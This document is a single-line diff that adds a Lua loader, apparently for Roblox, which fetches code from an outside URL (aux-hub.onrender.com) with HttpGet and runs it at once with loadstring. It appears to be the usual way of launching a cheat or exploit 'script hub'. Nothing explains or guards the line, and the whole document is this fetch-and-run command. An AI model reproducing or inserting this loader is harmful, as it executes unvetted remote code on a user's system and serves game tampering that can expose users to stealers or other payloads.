@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://aux-hub.onrender.com/"))()
